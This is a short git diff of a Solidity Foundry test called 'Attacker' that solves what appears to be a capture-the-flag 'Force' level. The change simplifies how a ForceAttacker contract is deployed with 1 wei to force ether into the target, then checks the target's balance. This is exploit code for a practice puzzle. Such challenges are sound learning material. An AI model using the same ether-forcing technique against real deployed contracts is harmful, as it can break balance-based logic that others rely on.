@@ -6,17 +6,11 @@ import "../instances/Ilevel07.sol";
 import "../src/level07.sol";
 
 contract Attacker is Test {
-    Force level06 = Force(0x982dAC71e5Eba5d02221B0B61e785516B2edBdF1);
+    Force level06 = Force(0x0D8664474d9209833499A7BdA087F20844eafA7B);
 
     function test() external {
-        ForceAttacker attacker = new ForceAttacker();
-
         vm.deal(address(this), 1 ether);
-
-        (bool sent,) = address(attacker).call{value: 1 wei}("");
-        require(sent, "Failed to send Ether");
-
-        attacker.exploit();
+        new ForceAttacker{value: 1 wei}(address(level06));
 
         assertEq(address(level06).balance, 1 wei);
     }
